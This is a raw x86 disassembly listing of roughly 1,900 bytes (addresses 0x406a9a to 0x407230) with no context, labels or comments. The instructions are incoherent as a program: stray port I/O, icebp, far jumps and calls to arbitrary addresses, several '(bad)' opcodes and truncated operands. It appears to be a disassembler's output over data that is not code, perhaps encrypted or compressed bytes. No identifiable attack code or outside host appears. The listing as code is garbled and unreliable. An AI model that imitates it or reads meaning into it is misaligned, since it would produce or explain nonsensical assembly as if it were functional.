  406a9a:	xchg   edx,eax
  406a9b:	mov    ch,0x77
  406a9d:	inc    ebx
  406a9e:	dec    ebx
  406a9f:	lods   eax,DWORD PTR ds:[esi]
  406aa0:	call   0x6bcc71d1
  406aa5:	or     dl,BYTE PTR [ebx-0x34]
  406aa8:	fsub   DWORD PTR [ebx+0x67]
  406aab:	imul   esp,DWORD PTR [esi-0x66],0x5f
  406aaf:	mov    esp,0xb9a4a1ba
  406ab4:	sub    BYTE PTR ss:[ecx],0xd0
  406ab8:	jae    0x406a48
  406aba:	xor    DWORD PTR ds:0x538a7407,ebx
  406ac0:	imul   ebp,DWORD PTR [edi+0x1],0x4e
  406ac4:	addr16 in al,0x54
  406ac7:	daa    
  406ac8:	mov    eax,ds:0x3fd5e197
  406acd:	pop    ebx
  406ace:	ins    BYTE PTR es:[edi],dx
  406acf:	aas    
  406ad0:	nop
  406ad1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406ad2:	jns    0x406a89
  406ad4:	bound  edx,QWORD PTR [ecx]
  406ad6:	dec    ebx
  406ad7:	loope  0x406ac1
  406ad9:	fld    DWORD PTR [edi]
  406adb:	add    eax,0xa686b17e
  406ae0:	imul   ecx,DWORD PTR [eax+edx*2],0xfd3770e3
  406ae7:	out    0xf6,al
  406ae9:	adc    al,0x71
  406aeb:	rol    DWORD PTR [esi+0x57],cl
  406aee:	pushf  
  406aef:	xchg   BYTE PTR [ebx+0x24],dh
  406af2:	xor    esi,edi
  406af4:	pop    es
  406af5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406af6:	mov    ah,BYTE PTR [edi+0x6a01b36b]
  406afc:	addr16 cs in al,0x27
  406b00:	xchg   ebx,eax
  406b01:	xchg   edx,eax
  406b02:	pop    ebx
  406b03:	pusha  
  406b04:	mov    esp,0x64ead931
  406b09:	icebp  
  406b0a:	stos   BYTE PTR es:[edi],al
  406b0b:	fbstp  TBYTE PTR [ecx]
  406b0d:	ds out 0x1c,al
  406b10:	mov    dl,0x6b
  406b12:	mov    dl,0xa
  406b14:	add    ebp,esp
  406b16:	xchg   bl,ah
  406b18:	fwait
  406b19:	or     al,0xed
  406b1b:	jecxz  0x406b75
  406b1d:	aaa    
  406b1e:	cld    
  406b1f:	out    0x8b,al
  406b21:	adc    al,0xb4
  406b23:	rcl    esi,cl
  406b25:	push   esi
  406b26:	stos   BYTE PTR es:[edi],al
  406b27:	ins    BYTE PTR es:[edi],dx
  406b28:	fisubr WORD PTR [ecx+0xcb2916b]
  406b2e:	loopne 0x406b96
  406b30:	pop    es
  406b31:	xchg   edi,eax
  406b32:	popf   
  406b33:	aad    0x65
  406b35:	pop    ebx
  406b36:	sbb    edi,DWORD PTR [edi]
  406b38:	mov    cl,0xa7
  406b3a:	std    
  406b3b:	mov    ch,0xf7
  406b3d:	sti    
  406b3e:	dec    ecx
  406b3f:	jp     0x406af3
  406b41:	out    dx,al
  406b42:	mov    dl,0xdb
  406b44:	add    esi,esi
  406b46:	xchg   DWORD PTR [eax-0x460b5eec],edi
  406b4c:	jbe    0x406ad0
  406b4e:	push   esi
  406b4f:	mov    WORD PTR ds:0xaaf733c1,?
  406b55:	xchg   edx,eax
  406b56:	rcr    BYTE PTR [esi-0x22],1
  406b59:	shr    DWORD PTR [ebx+0x4b],0xb2
  406b5d:	lock loopne 0x406bbd
  406b60:	mov    esi,0xa978e37b
  406b65:	add    DWORD PTR [edi-0x76],ebp
  406b68:	inc    esi
  406b69:	int    0x6b
  406b6b:	pusha  
  406b6c:	daa    
  406b6d:	xor    DWORD PTR ds:0xa8f03bea,ebx
  406b73:	sub    eax,0xb453236b
  406b78:	fmul   DWORD PTR [ebx-0x65906399]
  406b7e:	(bad)  
  406b7f:	mov    esp,0xb90ca1cf
  406b84:	ret    0x6082
  406b87:	mov    WORD PTR [esi],?
  406b89:	rcr    DWORD PTR [edx],0xa6
  406b8c:	stos   BYTE PTR es:[edi],al
  406b8d:	loope  0x406b5f
  406b8f:	sub    al,0xde
  406b91:	ret    0x5d6b
  406b94:	mov    dl,0xf4
  406b96:	loopne 0x406b1d
  406b98:	mov    esi,0xbb788310
  406b9d:	add    DWORD PTR [ebx],edx
  406b9f:	mov    al,BYTE PTR [ebp+0x5d6045cd]
  406ba5:	xor    DWORD PTR [ecx-0x16],ebp
  406ba8:	jns    0x406bf9
  406baa:	stos   BYTE PTR es:[edi],al
  406bab:	fdiv   DWORD PTR [ecx]
  406bad:	shl    dh,0x92
  406bb0:	mov    dl,0xfc
  406bb2:	mov    dl,0x13
  406bb4:	add    DWORD PTR [esi],ecx
  406bb6:	xchg   al,bl
  406bb8:	ror    DWORD PTR [esi*2-0x23c8921d],0xf1
  406bc0:	sbb    BYTE PTR [eax+0x31],ch
  406bc3:	popf   
  406bc4:	pop    es
  406bc5:	test   DWORD PTR [edx+0x1eb6bf3],0x6ab5671e
  406bcf:	daa    
  406bd0:	pop    esi
  406bd1:	xchg   edi,eax
  406bd2:	adc    al,0xd5
  406bd4:	test   al,0x5b
  406bd6:	lock aas 
  406bd8:	mov    ecx,0x94b57aa7
  406bdd:	lahf   
  406bde:	dec    ebx
  406bdf:	retf   0x57e8
  406be2:	pop    es
  406be3:	adc    DWORD PTR [ebx-0x59],ebp
  406be6:	push   ebx
  406be7:	push   esp
  406be8:	fadd   DWORD PTR [edx-0x65732b99]
  406bee:	dec    esp
  406bef:	mov    esp,0xb93ba113
  406bf4:	test   BYTE PTR [edx-0x88c26b6],0x31
  406bfb:	aad    0x7
  406bfd:	loop   0x406b89
  406bff:	imul   ebp,DWORD PTR [ebx-0x2c],0x6f67d201
  406c06:	pop    esi
  406c07:	daa    
  406c08:	fist   DWORD PTR [edx+0x31ff608b]
  406c0e:	inc    esp
  406c0f:	jmp    0xd731:0xb3aa157f
  406c16:	out    0x4,al
  406c18:	mov    dl,0x5d
  406c1a:	mov    dl,0xf4
  406c1c:	add    DWORD PTR [edx],edx
  406c1e:	xchg   BYTE PTR [ecx+ebx*2-0x251c83f4],bh
  406c25:	aaa    
  406c26:	adc    ah,dh
  406c28:	imul   edx,DWORD PTR [ebx+edi*2],0xffffffd3
  406c2c:	add    al,0xee
  406c2e:	rcl    BYTE PTR [esi+0x426b96de],1
  406c34:	mov    dl,0x20
  406c36:	loopne 0x406c4d
  406c38:	mov    esi,0x8478aaf5
  406c3d:	add    DWORD PTR [edx+ecx*4-0x28],esi
  406c41:	int    0xb1
  406c43:	pusha  
  406c44:	add    esi,DWORD PTR [ecx]
  406c46:	mov    ebp,edx
  406c48:	add    eax,0x318baafd
  406c4d:	pushf  
  406c4e:	out    0x56,al
  406c50:	mov    dl,0x5
  406c52:	mov    dl,0xe6
  406c54:	add    ecx,ecx
  406c56:	xchg   BYTE PTR [edi-0x1c64f3c4],bl
  406c5c:	loopne 0x406c95
  406c5e:	jb     0x406c46
  406c60:	lea    edx,[edx+esi*1]
  406c63:	shr    eax,cl
  406c65:	push   edi
  406c66:	ds js  0x406cdc
  406c69:	mov    edi,0x6f079231
  406c6e:	mov    bl,cl
  406c70:	imul   edi,esi,0x1
  406c73:	add    esp,DWORD PTR [edi+0x78]
  406c76:	lods   eax,DWORD PTR ds:[esi]
  406c77:	daa    
  406c78:	aas    
  406c79:	xchg   edi,eax
  406c7a:	adc    edx,ebp
  406c7c:	and    bl,BYTE PTR [ebx-0x5b]
  406c7f:	aas    
  406c80:	shl    DWORD PTR [edi-0x470b4a23],1
  406c86:	dec    ebx
  406c87:	fsubr  st,st(0)
  406c89:	dec    edi
  406c8a:	pop    es
  406c8b:	jae    0x406cf8
  406c8d:	ficom  DWORD PTR [ebx-0x2d]
  406c90:	mov    BYTE PTR [edx+edi*2],cl
  406c93:	jecxz  0x406cf9
  406c95:	aaa    
  406c96:	xor    ah,dh
  406c98:	push   edi
  406c99:	adc    al,0xf7
  406c9b:	rol    DWORD PTR [ecx+0x73326d57],cl
  406ca1:	and    DWORD PTR [ecx],esi
  406ca3:	add    DWORD PTR [edi],0xffffffd3
  406ca6:	mov    bl,BYTE PTR [ecx]
  406ca8:	imul   edi,DWORD PTR [eax+0x1],0x62
  406cac:	addr16 xor eax,0x97c527f4
  406cb2:	aam    0xd5
  406cb4:	out    dx,eax
  406cb5:	pop    ebx
  406cb6:	idiv   BYTE PTR [edi]
  406cb8:	pop    edi
  406cb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406cba:	(bad)  
  406cbb:	mov    ch,0xd2
  406cbd:	bound  ecx,QWORD PTR [ebx+0x76]
  406cc0:	call   0x6c247479
  406cc5:	pop    ss
  406cc6:	push   ebx
  406cc7:	imul   ebx,eax,0x3b3267a6
  406ccd:	call   0xb9b9:0xa1ffbc54
  406cd4:	and    al,0x82
  406cd6:	ror    BYTE PTR [edx+edi*2-0x55e53e3f],1
  406cdd:	xor    al,0xd0
  406cdf:	sbb    al,0xde
  406ce1:	lock imul edi,eax,0xffffffb2
  406ce5:	nop
  406ce6:	loopne 0x406c6a
  406ce8:	mov    edi,0x4dd5dd9f
  406ced:	pop    ebx
  406cee:	cwde   
  406cef:	aas    
  406cf0:	pop    edx
  406cf1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406cf2:	jno    0x406ca9
  406cf4:	sbb    ch,al
  406cf6:	dec    ebx
  406cf7:	sbb    eax,0x1207ace8
  406cfc:	imul   edi,DWORD PTR [ebx+edx*2],0x2a
  406d00:	fcom   st(6)
  406d02:	data16 and cl,ah
  406d05:	aaa    
  406d06:	das    
  406d07:	out    0xda,al
  406d09:	adc    al,0xdf
  406d0b:	rcl    DWORD PTR [edx+0x73c49957],cl
  406d11:	dec    esi
  406d12:	xor    al,0x89
  406d14:	mov    dl,0x2a
  406d16:	loopne 0x406cfc
  406d18:	mov    esi,0xec787bc9
  406d1d:	add    DWORD PTR [edx],edx
  406d1f:	mov    dl,BYTE PTR ds:0xd86089cd
  406d25:	xor    DWORD PTR [ecx-0x55494816],eax
  406d2b:	je     0x406d5e
  406d2d:	push   esi
  406d2e:	out    0x57,al
  406d30:	mov    dl,0x87
  406d32:	mov    dl,0x8e
  406d34:	add    DWORD PTR [ebx-0x7a],eax
  406d37:	xchg   edx,eax
  406d38:	gs or  al,0x8b
  406d3b:	jecxz  0x406daf
  406d3d:	aaa    
  406d3e:	popa   
  406d3f:	out    0xba,al
  406d41:	adc    al,0xac
  406d43:	shl    DWORD PTR [ecx+0x73965f57],cl
  406d49:	jo     0x406d7f
  406d4b:	dec    ecx
  406d4c:	mov    dl,0xa5
  406d4e:	loopne 0x406dc4
  406d50:	mov    esi,0xdc7833a4
  406d55:	add    DWORD PTR [ecx],esi
  406d57:	mov    ch,BYTE PTR [eax]
  406d59:	int    0xee
  406d5b:	pusha  
  406d5c:	das    
  406d5d:	xor    ecx,edx
  406d5f:	jmp    0x5731:0x66aada16
  406d66:	out    0xb9,al
  406d68:	mov    dl,0x41
  406d6a:	mov    dl,0x56
  406d6c:	add    DWORD PTR [ebp-0x7a],ebp
  406d6f:	xchg   ebx,eax
  406d70:	sahf   
  406d71:	or     al,0x7e
  406d73:	jecxz  0x406daf
  406d75:	aaa    
  406d76:	mov    cl,0xe6
  406d78:	call   0x1e57:0x6cd3a214
  406d7f:	mov    WORD PTR [ebx-0x51],?
  406d82:	xor    DWORD PTR [ecx+0x7],esp
  406d85:	fwait
  406d86:	mov    ch,al
  406d88:	imul   ebp,DWORD PTR [ebx+0x1],0x49
  406d8c:	addr16 pop es
  406d8e:	sbb    al,0x27
  406d90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406d91:	xchg   edi,eax
  406d92:	sub    ch,dl
  406d94:	clc    
  406d95:	pop    ebx
  406d96:	and    bh,BYTE PTR [edi]
  406d98:	enter  0x19a7,0xb5
  406d9c:	sub    DWORD PTR [edx+0x4b],ebx
  406d9f:	test   al,0xe8
  406da1:	mov    eax,ds:0xd16bad07
  406da6:	push   ebx
  406da7:	jge    0x406d81
  406da9:	sub    DWORD PTR [edi-0x6d],esp
  406dac:	mov    dl,0x9a
  406dae:	push   edi
  406daf:	mov    esp,0xb95aa11e
  406db4:	les    eax,FWORD PTR [edx-0x178c2ef6]
  406dba:	xor    DWORD PTR [edi+eax*1-0x3a],edi
  406dbe:	mov    ah,al
  406dc0:	imul   ebp,DWORD PTR [ecx+eax*1],0xffffff9d
  406dc4:	addr16 inc ebp
  406dc6:	ss daa 
  406dc8:	adc    BYTE PTR [edi+0x5b59d546],dl
  406dce:	ins    BYTE PTR es:[edi],dx
  406dcf:	aas    
  406dd0:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406dd2:	cdq    
  406dd3:	mov    ch,0x5b
  406dd5:	ss dec ebx
  406dd7:	sub    al,0x99
  406dda:	pop    es
  406ddb:	push   edi
  406ddc:	imul   esp,DWORD PTR [edi+0x6dd86853],0x67
  406de3:	sub    al,0x57
  406de5:	call   0xb99e:0xa1b1bcdd
  406dec:	test   al,0x82
  406dee:	dec    eax
  406def:	mov    WORD PTR [edx-0x55bbe23f],cs
  406df5:	jne    0x406dc7
  406df7:	out    0xde,al
  406df9:	xchg   BYTE PTR [ebx+0x7],ch
  406dfc:	mov    dl,0x1d
  406dfe:	loopne 0x406dcf
  406e00:	mov    esi,0x9a7874b0
  406e05:	add    DWORD PTR [edx+ecx*4+0x3b],eax
  406e09:	int    0x3e
  406e0b:	pusha  
  406e0c:	mov    ebp,0x2ea2331
  406e11:	sbb    eax,0x7a31e0aa
  406e16:	out    0x77,al
  406e18:	mov    dl,0xb
  406e1a:	mov    dl,0x65
  406e1c:	add    DWORD PTR [eax+0xc7db086],ecx
  406e22:	retf   0xede3
  406e25:	aaa    
  406e26:	xchg   edi,eax
  406e27:	out    0xd2,al
  406e29:	adc    al,0xfc
  406e2b:	shr    DWORD PTR [edi+0x73276357],cl
  406e31:	mov    BYTE PTR [ecx],dh
  406e33:	dec    esi
  406e34:	pop    es
  406e35:	cmc    
  406e36:	mov    ch,ah
  406e38:	imul   ebp,ebp,0x1
  406e3b:	mov    al,0x67
  406e3d:	mov    ch,bh
  406e3f:	daa    
  406e40:	cmc    
  406e41:	xchg   edx,eax
  406e42:	fwait
  406e43:	pusha  
  406e44:	ja     0x406e77
  406e46:	jns    0x406e32
  406e48:	in     al,dx
  406e49:	out    0xaa,al
  406e4b:	lea    esi,[ecx]
  406e4d:	fs out 0xd5,al
  406e50:	mov    dl,0x77
  406e52:	mov    dl,0x9a
  406e54:	add    DWORD PTR [esi+eax*4+0x6b],edi
  406e58:	retf   0x220c
  406e5b:	jecxz  0x406ea1
  406e5d:	aaa    
  406e5e:	jmp    0xf4547349
  406e63:	ror    DWORD PTR [eax+0x7364b457],cl
  406e69:	pop    es
  406e6a:	xor    DWORD PTR [eax],edi
  406e6c:	pop    es
  406e6d:	outs   dx,BYTE PTR ds:[esi]
  406e6e:	sahf   
  406e6f:	int3   
  406e70:	mov    esi,0xd37864dc
  406e75:	add    DWORD PTR [edi-0x76],ebp
  406e78:	cs int 0x81
  406e7b:	pusha  
  406e7c:	mov    WORD PTR [ecx],?
  406e7e:	pop    esi
  406e7f:	jmp    0xa431:0x31aaf75e
  406e86:	out    0x53,al
  406e88:	mov    dl,0x16
  406e8a:	mov    dl,0xd7
  406e8c:	add    DWORD PTR ds:0xc0d9186,esp
  406e92:	out    dx,eax
  406e93:	jecxz  0x406eac
  406e95:	aaa    
  406e96:	addr16 out 0x1f,al
  406e99:	adc    al,0xd2
  406e9b:	rcl    DWORD PTR [edx+0x57],cl
  406e9e:	sbb    bl,BYTE PTR [edi-0xace6f8d]
  406ea4:	pop    es
  406ea5:	aam    0x8a
  406ea7:	lea    ebp,[ebx+0x46]
  406eaa:	add    ecx,ebp
  406eac:	addr16 test edi,eax
  406eaf:	daa    
  406eb0:	pusha  
  406eb1:	xchg   edi,eax
  406eb2:	and    al,0xd5
  406eb4:	xor    DWORD PTR [ebx+0x42],ebx
  406eb7:	aas    
  406eb8:	sbb    BYTE PTR [edi-0x5efb4a38],ah
  406ebe:	dec    ebx
  406ebf:	fucomi st,st(0)
  406ec1:	mov    WORD PTR [edi],es
  406ec3:	jb     0x406f30
  406ec5:	aas    
  406ec6:	push   ebx
  406ec7:	mov    ah,0x84
  406ec9:	or     al,0x4d
  406ecb:	jecxz  0x406f46
  406ecd:	aaa    
  406ece:	(bad)  
  406ecf:	out    0xa8,al
  406ed1:	adc    al,0x18
  406ed3:	shl    ebp,cl
  406ed5:	push   edi
  406ed6:	jno    0x406e5f
  406ed8:	jae    0x406f40
  406eda:	xor    esi,ebx
  406edc:	pop    es
  406edd:	xchg   edi,eax
  406ede:	mov    bh,ch
  406ee0:	imul   edx,DWORD PTR [ebx+edi*2-0xf],0xfffffff5
  406ee5:	pop    ebx
  406ee6:	ret    
  406ee7:	mov    gs,WORD PTR [ebx+0x79]
  406eea:	add    DWORD PTR [eax+0x67],eax
  406eed:	dec    eax
  406eee:	test   al,0x27
  406ef0:	xor    DWORD PTR [edx+0x311a604b],edx
  406ef6:	mov    dl,ch
  406ef8:	mov    dh,0xdd
  406efa:	stos   BYTE PTR es:[edi],al
  406efb:	ds xor ebx,eax
  406efe:	out    0x41,al
  406f00:	mov    dl,0x2f
  406f02:	mov    dl,0xa
  406f04:	add    DWORD PTR [eax-0x7a],edx
  406f07:	jecxz  0x406ed2
  406f09:	or     al,0xa6
  406f0b:	jecxz  0x406f73
  406f0d:	aaa    
  406f0e:	cmp    esp,esi
  406f10:	clc    
  406f11:	adc    al,0x5c
  406f13:	shl    DWORD PTR [ebx+0x57],cl
  406f16:	(bad)  
  406f17:	xor    DWORD PTR [ebx+0x2d],esi
  406f1a:	xor    DWORD PTR [eax-0x11754ff9],esp
  406f20:	imul   ecx,DWORD PTR [edx],0x1
  406f23:	arpl   WORD PTR [edi-0x72],sp
  406f26:	cli    
  406f27:	daa    
  406f28:	setb   BYTE PTR [ebx+0x18319560]
  406f2f:	jmp    0xe031:0xeaa95db
  406f36:	out    0x7c,al
  406f38:	mov    dl,0x48
  406f3a:	mov    dl,0xfd
  406f3c:	add    DWORD PTR [eax],eax
  406f3e:	xchg   BYTE PTR [edx-0x5b],al
  406f41:	or     al,0xb4
  406f43:	jecxz  0x406fac
  406f45:	aaa    
  406f46:	aad    0xe6
  406f48:	ds adc al,0x84
  406f4b:	rcr    DWORD PTR [ebp+0x57],cl
  406f4e:	dec    edx
  406f50:	jae    0x406f2a
  406f52:	xor    eax,ebp
  406f54:	pop    es
  406f55:	pusha  
  406f56:	mov    cl,dh
  406f58:	imul   eax,DWORD PTR [ecx+eax*1],0xffffffbe
  406f5c:	addr16 iret 
  406f5e:	loopne 0x406f87
  406f60:	rcl    BYTE PTR [edi+0x5babd5b3],1
  406f66:	test   BYTE PTR [edi],bh
  406f68:	adc    al,0xa7
  406f6a:	fwait
  406f6b:	mov    ch,0x37
  406f6d:	int    0x4b
  406f6f:	lock call 0x6b6a7703
  406f75:	repz push ebx
  406f77:	pushf  
  406f78:	fdivr  DWORD PTR [edi-0x65950499]
  406f7e:	les    edi,FWORD PTR [esi+ebx*8-0x1e46805f]
  406f85:	adc    BYTE PTR [ecx],0x8c
  406f88:	push   esi
  406f89:	rol    DWORD PTR [ecx+0x60],0xaa
  406f8d:	xchg   al,dl
  406f8f:	dec    edx
  406f90:	fdivp  st(4),st
  406f92:	imul   edx,DWORD PTR [esi],0xffffffb2
  406f95:	fstp   TBYTE PTR [edi+eiz*1-0x2a516869]
  406f9c:	neg    BYTE PTR [ebx-0x74]
  406f9f:	aas    
  406fa0:	push   ebx
  406fa1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406fa2:	dec    edi
  406fa3:	mov    ch,0x75
  406fa5:	out    0x4b,eax
  406fa7:	inc    esp
  406fa8:	call   0x6bcb778d
  406fad:	mov    ebp,0x3fd8a653
  406fb2:	mov    DWORD PTR ds:0xec9a,eax
  406fb7:	mov    esp,0xb985a1e6
  406fbc:	xchg   edi,eax
  406fbd:	add    BYTE PTR [esp+ecx*4],0x12
  406fc1:	sar    esi,0x85
  406fc4:	stos   BYTE PTR es:[edi],al
  406fc5:	or     al,0xd0
  406fc7:	in     eax,0xde
  406fc9:	cmp    BYTE PTR [ebx+0x7a],ch
  406fcc:	mov    dl,0x99
  406fce:	loopne 0x406fae
  406fd0:	mov    esi,0x457896bb
  406fd5:	add    DWORD PTR [edx-0x2a320676],ecx
  406fdb:	pusha  
  406fdc:	sub    eax,0xcfeaa331
  406fe1:	shr    BYTE PTR [edx-0x196aceb8],cl
  406fe7:	outs   dx,DWORD PTR ds:[esi]
  406fe8:	mov    dl,0x98
  406fea:	mov    dl,0x6f
  406fec:	add    edx,esi
  406fee:	xchg   BYTE PTR [esi+0x62],dl
  406ff1:	or     al,0x32
  406ff3:	jecxz  0x40703f
  406ff5:	aaa    
  406ff6:	sbb    esp,esi
  406ff8:	je     0x40700e
  406ffa:	mov    bh,0xd3
  406ffc:	mov    eax,0x7329dc57
  407001:	ins    BYTE PTR es:[edi],dx
  407002:	xor    DWORD PTR [edi],edi
  407004:	pop    es
  407005:	inc    esi
  407006:	mov    al,BYTE PTR [esi+0x7d015a6b]
  40700c:	addr16 mov dl,0x4b
  40700f:	daa    
  407010:	not    DWORD PTR [edi+0x5bc5d59c]
  407016:	cmp    BYTE PTR [edi],0x92
  407019:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40701a:	bound  esi,QWORD PTR [ebp-0x5eb4c146]
  407020:	in     eax,dx
  407021:	sub    eax,0xa801a5b2
  407026:	xchg   BYTE PTR [eax+0x56d785ab],bh
  40702c:	jae    0x40709b
  40702e:	or     ebx,0xffffffa9
  407031:	lahf   
  407032:	cmp    al,0xe6
  407034:	xchg   eax,edx
  407036:	inc    edx
  407037:	mov    DWORD PTR [ebx+edx*1+0x13485a18],esp
  40703e:	or     DWORD PTR [ecx+0x5dd2c067],esi
  407044:	(bad)  [ebx+0x36]
  407047:	in     eax,0xfd
  407049:	data16 and BYTE PTR [edx+0x3],ah
  40704d:	and    edx,DWORD PTR [edx-0x5]
  407050:	push   edi
  407051:	repz dec esi
  407053:	in     al,dx
  407054:	aad    0x9b
  407056:	push   cs
  407057:	out    dx,al
  407058:	imul   esi,DWORD PTR [eax+0x21],0xffffffbd
  40705c:	push   es
  40705d:	pop    esp
  40705e:	ror    DWORD PTR [ebx+0x2d],0x79
  407062:	out    0xdb,al
  407064:	call   0xd90f5522
  407069:	add    eax,0xb041f196
  40706e:	dec    ebp
  40706f:	jo     0x4070bc
  407071:	fild   QWORD PTR [edx-0x2c]
  407074:	and    ebp,DWORD PTR [ecx+0x6fbfc9d9]
  40707a:	sub    eax,0x3c137e69
  40707f:	outs   dx,BYTE PTR ds:[esi]
  407080:	sbb    eax,DWORD PTR [esi+0xc]
  407083:	test   BYTE PTR [ecx],ah
  407085:	xchg   edx,eax
  407086:	ret    0xae2
  407089:	xchg   edi,eax
  40708a:	scas   al,BYTE PTR es:[edi]
  40708b:	mov    bh,0xb4
  40708d:	mov    al,0xa9
  40708f:	scas   al,BYTE PTR es:[edi]
  407090:	sub    DWORD PTR [ebp+eiz*8-0xe],edi
  407094:	lods   al,BYTE PTR ds:[esi]
  407095:	dec    esp
  407096:	and    eax,0xbf17fbbb
  40709b:	fs pushf 
  40709d:	jle    0x407057
  40709f:	inc    ebp
  4070a0:	xlat   BYTE PTR cs:[ebx]
  4070a2:	jp     0x407095
  4070a4:	stc    
  4070a5:	(bad)  
  4070a6:	jl     0x4070d5
  4070a8:	xlat   BYTE PTR ds:[ebx]
  4070a9:	fst    QWORD PTR [edi-0x30]
  4070ac:	and    eax,eax
  4070ae:	mov    ecx,DWORD PTR [esi-0x6d]
  4070b1:	lods   al,BYTE PTR ds:[esi]
  4070b2:	lods   eax,DWORD PTR ds:[esi]
  4070b3:	cmp    bl,ch
  4070b5:	adc    BYTE PTR [esi+0x490c38db],al
  4070bb:	add    eax,0x37ba6aeb
  4070c0:	cli    
  4070c1:	fstp   QWORD PTR ds:0xb3aa049a
  4070c7:	jae    0x40710d
  4070c9:	test   edx,eax
  4070cb:	mov    esi,0x34ae395
  4070d0:	in     eax,dx
  4070d1:	dec    esp
  4070d2:	and    edx,ecx
  4070d4:	(bad)  
  4070d5:	jne    0x407096
  4070d7:	pusha  
  4070d8:	shl    BYTE PTR [ecx],0x40
  4070db:	icebp  
  4070dc:	cld    
  4070dd:	pop    ecx
  4070de:	fimul  DWORD PTR [ebx-0x20]
  4070e1:	mov    ah,0xa1
  4070e3:	and    ax,WORD PTR [edx-0xf]
  4070e7:	into   
  4070e8:	cwde   
  4070e9:	(bad)  
  4070ea:	pop    esp
  4070eb:	mov    ah,0x92
  4070ed:	adc    esp,DWORD PTR [esi+0x483e1ad9]
  4070f3:	pop    edi
  4070f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4070f5:	in     eax,dx
  4070f6:	ret    0x5a2f
  4070f9:	cdq    
  4070fa:	(bad)  
  4070fc:	or     BYTE PTR [edi-0x124d504e],al
  407102:	jnp    0x407182
  407104:	data16 out dx,al
  407106:	fisttp DWORD PTR [edx+0x24]
  407109:	jmp    0x68b1e731
  40710e:	cmp    bl,BYTE PTR [ecx]
  407110:	push   ecx
  407111:	div    al
  407113:	icebp  
  407114:	add    BYTE PTR [ecx-0x77],ah
  407117:	lods   al,BYTE PTR ds:[esi]
  407118:	sbb    BYTE PTR [esi+0x3c],ah
  40711b:	jle    0x407159
  40711d:	inc    esp
  40711e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40711f:	sti    
  407120:	jp     0x4070d1
  407122:	xchg   ecx,eax
  407123:	sbb    cl,BYTE PTR [ebx]
  407125:	adc    al,0xed
  407127:	scas   al,BYTE PTR es:[edi]
  407128:	dec    edi
  407129:	inc    edi
  40712a:	and    BYTE PTR [edi-0x1a],dh
  40712d:	push   0xb2f57d58
  407132:	sub    edx,DWORD PTR [ebx+edx*1-0xe]
  407136:	inc    ebp
  407137:	pop    esp
  407138:	fnstcw WORD PTR [edx]
  40713a:	inc    DWORD PTR [ebx+0x21]
  40713d:	adc    eax,ecx
  40713f:	les    eax,FWORD PTR [eax+0x68]
  407142:	xor    eax,0xc2997f73
  407147:	popa   
  407148:	out    0xae,al
  40714a:	test   BYTE PTR [eax-0x51ce7e69],cl
  407150:	std    
  407151:	ja     0x407126
  407153:	mov    edi,0xcb63f14a
  407158:	cli    
  407159:	pop    edi
  40715a:	xlat   BYTE PTR ds:[ebx]
  40715b:	cmp    al,0x25
  40715d:	push   ss
  40715e:	jl     0x4071db
  407160:	sub    eax,DWORD PTR [edi+edx*1+0x64d73c93]
  407167:	push   eax
  407168:	jo     0x4071c3
  40716a:	or     eax,0x608e20a2
  40716f:	pop    ebp
  407170:	scas   eax,DWORD PTR es:[edi]
  407171:	and    eax,0x21c22126
  407176:	data16 scas al,BYTE PTR es:[edi]
  407178:	or     al,0x6e
  40717a:	push   esi
  40717b:	cli    
  40717c:	mov    al,ds:0xfaeefbff
  407181:	in     eax,0xcc
  407183:	pop    ebx
  407184:	jge    0x4071e8
  407186:	pop    ebp
  407187:	test   al,0x47
  407189:	or     BYTE PTR [ebp-0x1f],0x72
  40718d:	sub    eax,0x13652fe3
  407192:	(bad)  
  407193:	sbb    al,0x1e
  407195:	fmul   QWORD PTR [edx]
  407197:	stos   DWORD PTR es:[edi],eax
  407198:	push   esp
  407199:	enter  0x1723,0x9e
  40719d:	push   ebp
  40719e:	push   ebx
  40719f:	cli    
  4071a0:	ja     0x4071d2
  4071a2:	push   edx
  4071a3:	iret   
  4071a4:	out    0x4e,eax
  4071a6:	inc    edx
  4071a7:	stos   BYTE PTR es:[edi],al
  4071a8:	cld    
  4071a9:	push   ecx
  4071aa:	dec    esp
  4071ab:	xchg   ecx,eax
  4071ac:	jae    0x4071b4
  4071ae:	ret    0xe351
  4071b1:	sbb    eax,0xaef5d5d8
  4071b6:	sub    ebp,DWORD PTR [esi-0x4d9cf393]
  4071bc:	out    dx,eax
  4071bd:	je     0x4071da
  4071bf:	xor    ch,dh
  4071c1:	repnz xchg ebx,eax
  4071c3:	sbb    DWORD PTR [ecx-0x24],esp
  4071c6:	lds    ecx,FWORD PTR [esi]
  4071c8:	jno    0x4071d7
  4071ca:	(bad)  
  4071cb:	call   0xd83a8548
  4071d0:	xor    ch,BYTE PTR [ebx-0x8]
  4071d3:	push   eax
  4071d4:	pop    edi
  4071d5:	sbb    DWORD PTR [ecx+0x2cc7fbe9],esi
  4071db:	sbb    bl,bl
  4071dd:	xchg   edi,eax
  4071de:	fsub   QWORD PTR [edi-0x78]
  4071e1:	shl    DWORD PTR [ebx],0xf8
  4071e4:	mov    ds:0xd19c4195,eax
  4071e9:	push   0x223b95d
  4071ee:	mov    dl,0x2
  4071f0:	xchg   esi,eax
  4071f1:	fist   WORD PTR [ecx-0x41]
  4071f4:	ficom  WORD PTR [ebx]
  4071f6:	int3   
  4071f7:	push   ecx
  4071f8:	add    DWORD PTR [edx+0x2e75c9a6],ecx
  4071fe:	ret    0x2f00
  407201:	fwait
  407202:	adc    eax,0xc8341adc
  407207:	push   esp
  407208:	and    eax,DWORD PTR [ebp-0x4a8066b9]
  40720e:	jecxz  0x407245
  407210:	mov    eax,ds:0x72023d1
  407215:	and    eax,0x8ff694ec
  40721a:	inc    esp
  40721b:	icebp  
  40721c:	xchg   edx,eax
  40721d:	adc    BYTE PTR [ebp-0x32ce0ab7],0x67
  407224:	and    eax,ecx
  407226:	fnstenv ds:0x31a31b6b
  40722c:	out    0x13,al
  40722e:	(bad)  
  40722f:	iret   
  407230:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
